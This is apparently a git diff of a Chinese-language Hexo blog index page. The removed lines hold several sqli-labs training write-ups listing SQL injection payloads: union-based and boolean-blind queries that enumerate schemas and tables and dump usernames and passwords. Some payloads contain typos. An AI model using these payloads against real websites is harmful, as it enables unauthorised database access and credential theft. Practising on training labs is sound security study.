@@ -1,1207 +1,380 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.2">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"dokidokiy.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Dokiy">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Dokiy's Blog</title><meta name="author" content="Dokiy"><meta name="copyright" content="Dokiy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
+<meta property="og:title" content="Dokiy&#39;s Blog">
 <meta property="og:url" content="https://dokidokiy.github.io/page/2/index.html">
-<meta property="og:site_name" content="Dokiy">
+<meta property="og:site_name" content="Dokiy&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:author" content="aurora">
+<meta property="og:image" content="https://dokidokiy.github.io/img/head.png">
+<meta property="article:author" content="Dokiy">
 <meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="https://dokidokiy.github.io/page/2/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : true,
-    isPost : false,
-    lang   : 'zh-CN'
-  };
-</script>
-
-  <title>Dokiy</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
+<meta name="twitter:image" content="https://dokidokiy.github.io/img/head.png"><link rel="shortcut icon" href="/img/head.png"><link rel="canonical" href="https://dokidokiy.github.io/page/2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Dokiy\'s Blog',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-07-17 15:26:54'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
   }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Dokiy</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content index posts-expand">
-            
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dokidokiy.github.io/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="aurora">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dokiy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/" class="post-title-link" itemprop="url">sql-labs靶场less6</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-05-14 09:56:33" itemprop="dateCreated datePublished" datetime="2023-05-14T09:56:33+08:00">2023-05-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-15 00:00:21" itemprop="dateModified" datetime="2023-05-15T00:00:21+08:00">2023-05-15</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1.判断注入点（双引号注入）</p>
-<pre><code>?id=1&quot; and 1 --a   页面显示正常
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514203911904.png" alt="image-20230514203911904"></p>
-<pre><code>?id=1&quot; and 0 -- a   页面异常（空显示）
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514205048775.png" alt="image-20230514205048775"></p>
-<p>2.判断字符长度</p>
-<p>判断当前使用的数据库长度是否大于1</p>
-<pre><code>?id=1&quot; and length(database())=8 --+
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514221524192.png" alt="image-20230514221524192"></p>
-<p>3.穷举字符</p>
-<p>判断当前使用的数据库第一个字符的ascll码是否大于1（肯定大于），地址栏输入</p>
-<pre><code>?id=1&quot; and ascii(substr(database(),1,1)) &gt; 1 -- a
-</code></pre>
-<pre><code>?id=1&quot; and left(database(),1)=&#39;s&#39; --+
-
-用穷举的方法一个个列出来，....效率有点慢了
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514222128909.png" alt="image-20230514222128909"></p>
-<pre><code>?id=1&quot; and left(database(),8)=&#39;security&#39; --+
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514225957158.png" alt="image-20230514225957158"></p>
-<p>4.判断库中每个表名的长度</p>
-<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 6--+
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514232750125.png" alt="image-20230514232750125"></p>
-<p>第一个表的长度是6</p>
-<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) = 8--+
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514232933832.png" alt="image-20230514232933832"></p>
-<p>第二个表的长度为8</p>
-<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 2,1)) = 7--+
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233146882.png" alt="image-20230514233146882"></p>
-<p>第三个表的长度为7</p>
-<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 3,1)) = 5--+
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233314642.png" alt="image-20230514233314642"></p>
-<p>第四个表的长度为5</p>
-<p>5.爆破表名</p>
-<pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 100 --+
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233558822.png" alt="image-20230514233558822"></p>
-<pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233732069.png" alt="image-20230514233732069"></p>
-<p>查看ascii表101是e，第一个表开头字母是e</p>
-<p>…..此处省略一些步骤</p>
-<pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115 --+
-</code></pre>
-<p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514234142010.png" alt="image-20230514234142010"></p>
-<p>查看ascii表115是u，第一个表开头字母是u</p>
-<p>….表名是users</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dokidokiy.github.io/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="aurora">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dokiy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/" class="post-title-link" itemprop="url">sql-labs靶场less4</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-05-13 23:43:53" itemprop="dateCreated datePublished" datetime="2023-05-13T23:43:53+08:00">2023-05-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-14 00:17:46" itemprop="dateModified" datetime="2023-05-14T00:17:46+08:00">2023-05-14</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>在复习一下less4</p>
-<p>less-3是单引号+右括号，less-4是双引号+右括号</p>
-<p>1.判断注入点</p>
-<p>一开始，？id=1 直接回显用户名和密码，</p>
-<p>​              ？id=1’ 也是直接回显用户名和密码</p>
-<p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230513235842630.png" alt="image-20230513235842630"></p>
-<p>在尝试一下别的符号</p>
-<p>?id=1”  出现报错信息</p>
-<p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514000027873.png" alt="image-20230514000027873"></p>
-<p>错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。</p>
-<p>2.查字段名</p>
-<p>输入</p>
-<pre><code>?id=1&quot;) order by 4 --+
-</code></pre>
-<p>后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列</p>
-<p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514000300269.png" alt="image-20230514000300269"></p>
-<p>3.查输出列的位置</p>
-<pre><code>?id=-1&quot;) union select 1,2,3 --+
-</code></pre>
-<p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514000817750.png" alt="image-20230514000817750"></p>
-<p>4.查看当前数据库和版本</p>
-<pre><code>?id=-1&quot;) union select 1,database(),version() --+
-</code></pre>
-<p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001038494.png" alt="image-20230514001038494"></p>
-<p>5.查看当前数据库下的表</p>
-<pre><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+
-</code></pre>
-<p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001411510.png" alt="image-20230514001411510"></p>
-<p>6.查看user表下面的字段信息</p>
-<pre><code>?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+
-</code></pre>
-<p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001554807.png" alt="image-20230514001554807"></p>
-<p>7.查看字段数据</p>
-<pre><code>?id=-1&quot;) union select 1,group_concat(username,0x2a,password),3 from users --+
-</code></pre>
-<p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001730590.png" alt="image-20230514001730590"></p>
-<p>完成！！！！！！</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dokidokiy.github.io/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="aurora">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dokiy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/" class="post-title-link" itemprop="url">sql-labs靶场less3</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-05-13 20:31:35 / 修改时间：23:17:16" itemprop="dateCreated datePublished" datetime="2023-05-13T20:31:35+08:00">2023-05-13</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>今天浅浅复习一下</p>
-<p>1.判断注入点，</p>
-<p>输入？id=1 显示正常 </p>
-<p>​     ？id=1’ 不正常  说明存在注入</p>
-<p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513221043279.png" alt="image-20230513221043279"></p>
-<p>上图显示）附近有语法错误，所以构造语句的时候需要用）进行闭合</p>
-<pre><code>?id=1&#39;) union select 1 --+
-</code></pre>
-<p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224322394.png" alt="image-20230513224322394"></p>
-<p>上面图片显示列数不正确，盲猜试试三列</p>
-<p>2.判断字段数</p>
-<pre><code>?id=1&#39;) union select 1,2,3 --+
-</code></pre>
-<p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224510771.png" alt="image-20230513224510771"></p>
-<p>字段数为4时报错，说明字段数为3</p>
-<p>3.判断回显</p>
-<p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224733973.png" alt="image-20230513224733973"></p>
-<p>4.查看当前数据库和版本</p>
-<pre><code>?id=-1&#39;) union select 1,database(),version() --+
-</code></pre>
-<p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224934066.png" alt="image-20230513224934066"></p>
-<p>5.查看数据库名称</p>
-<pre><code>?id=-1&#39;) union select 1，group_concat(schema_name),3 from information_schema.schemata --+
-</code></pre>
-<p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513230621168.png" alt="image-20230513230621168"></p>
-<p>6.查看security库里面的表名</p>
-<pre><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;
-</code></pre>
-<p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513231141345.png" alt="image-20230513231141345"></p>
-<p>7.获取列名</p>
-<pre><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+
-</code></pre>
-<p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513231403867.png" alt="image-20230513231403867"></p>
-<p>8.字段数据</p>
-<p>获取到字段后，根据字段获取表里的数据。字段名之间再加上*字符的十六进制，可以把账号密码隔开，容易区分</p>
-<pre><code>?id=-1&#39;) union select 1,group_concat(username,0x2a,password),3 from users --+
-</code></pre>
-<p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513231622174.png" alt="image-20230513231622174"></p>
-<p>完成！！！</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dokidokiy.github.io/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="aurora">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dokiy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/" class="post-title-link" itemprop="url">sql-labs靶场less2</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-05-12 21:26:15" itemprop="dateCreated datePublished" datetime="2023-05-12T21:26:15+08:00">2023-05-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-13 20:01:03" itemprop="dateModified" datetime="2023-05-13T20:01:03+08:00">2023-05-13</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>练习回顾靶场less2</p>
-<p>tips：可以打开每一关的源码，在该位置添加一句代码方便做题分析，</p>
-<pre><code>echo&quot;sql里面执行的是&quot;.$sql.&quot;&lt;br&gt;&quot;;
-</code></pre>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225159607.png" alt="image-20230512225159607"></p>
-<p>1.判断注入类型</p>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225353576.png" alt="image-20230512225353576"></p>
-<p>可以知道是数值型</p>
-<p>2.判断字段数</p>
-<pre><code>?id=1 order by 4 不正常
-?id=1 order by 3 正常
-</code></pre>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225530782.png" alt="image-20230512225530782"></p>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225927074.png" alt="image-20230512225927074"></p>
-<p>可以确定有三列</p>
-<p>3.判断可以回显的字段数</p>
-<pre><code>?id=-1 union select 1,2,3
-</code></pre>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513193541123.png" alt="image-20230513193541123"></p>
-<p>4.判断数据库名和版本</p>
-<pre><code>?id=-1 union select 1,database(),version()
-</code></pre>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513194524358.png" alt="image-20230513194524358"></p>
-<p>5.获取表名</p>
-<pre><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;
-</code></pre>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195104430.png" alt="image-20230513195104430"></p>
-<p>6.获取列名</p>
-<pre><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;
-</code></pre>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195526249.png" alt="image-20230513195526249"></p>
-<p>7.获取数据</p>
-<pre><code>?id=-1 union select 1,username,password from security.users limit 0,1 --+
-</code></pre>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195823876.png" alt="image-20230513195823876"></p>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195921714.png" alt="image-20230513195921714"></p>
-<p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513200006154.png" alt="image-20230513200006154"></p>
-<p>第n条…..依次类推limit n，1</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dokidokiy.github.io/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="aurora">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dokiy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/" class="post-title-link" itemprop="url">sql-labs靶场less1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-05-11 22:09:46 / 修改时间：23:39:07" itemprop="dateCreated datePublished" datetime="2023-05-11T22:09:46+08:00">2023-05-11</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>复习一下之前所学的知识：</p>
-<p>less1复盘一</p>
-<p>1.判断是否存在注入点</p>
-<pre><code>？id=1&#39;
-</code></pre>
-<p>在id参数后面加单引号使其报错，可以发现它是由单引号闭合的</p>
-<p><img src="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230511222256830.png" alt="image-20230511222256830"></p>
-<p>然后尝试一下</p>
-<pre><code>？id=1&#39; and 1=1 --+
-</code></pre>
-<p>语句显示正常</p>
-<p><img src="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230511222644095.png" alt="image-20230511222644095"></p>
-<pre><code>？id=1&#39; and 1=2 --+
-</code></pre>
-<p><img src="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230511222747190.png" alt="image-20230511222747190"></p>
-<p>将and 1=1 换成 and 1=2发现访问正常但显示不正常，可以确定存在注入点</p>
-<p>接下来判断一下字段数</p>
-<p>2.判断字段</p>
-<pre><code>？id=1&#39; order by 4 --+
-</code></pre>
-<p><img src="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230511223831584.png" alt="image-20230511223831584"></p>
-<p>页面显示没有这个字段，改成3试试</p>
-<p><img src="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230511224319103.png" alt="image-20230511224319103"></p>
-<p>显示正常，说明字段数为3</p>
-<p>3.联合查询一下</p>
-<pre><code>？id=-1&#39; union select 1,2,3 --+
-</code></pre>
-<p>这里在参数前加上-号使后面的1，2，3中操作的部分得以显示出来</p>
-<p><img src="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230511225322124.png" alt="image-20230511225322124"></p>
-<p>4.查询数据库和版本</p>
-<pre><code>?id= -1&#39; uion select 1,database(),version() --+
-</code></pre>
-<p>在2和3的位置上添加payload，这里使用database（）和version()查看当前数据库和版本</p>
-<p><img src="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230511230116208.png" alt="image-20230511230116208"></p>
-<p>获取security 数据库下的所有表名，在mysql版本&gt;=5.0时MySQL会自带几个数据库，其中information_schema数据库存储了所有的数据库名、表名及字段名，可以借助这个数据库获取想要的表名及字段名从而获得里面的数据。</p>
-<pre><code>?id=1&#39; union select 1,group_concat(table_name),3 from information_shema.tables where table_schema=database() --+
-</code></pre>
-<p><img src="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230511232508177.png" alt="image-20230511232508177"></p>
-<p>一共有四个表，下面查看users表</p>
-<pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+
-</code></pre>
-<p><img src="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230511232829929.png" alt="image-20230511232829929"></p>
-<p>查询出来users表的字段，下面就是查username和password</p>
-<pre><code>?id=-1&#39; union select 1,username,password from pikachu.users--+
-</code></pre>
-<p><img src="/2023/05/11/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230511233447010.png" alt="image-20230511233447010"></p>
-<p>由于该表存储的数据就是一开始显示的无法达到效果，所以下面借助pikachu这个数据库下的users表的内容来展示最后获取的账号和密码信息</p>
-<h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>造成sql注入的主要原因还是代码层面，没有对用户输入进行严格的判断和过滤，从而形成了sql注入漏洞。</p>
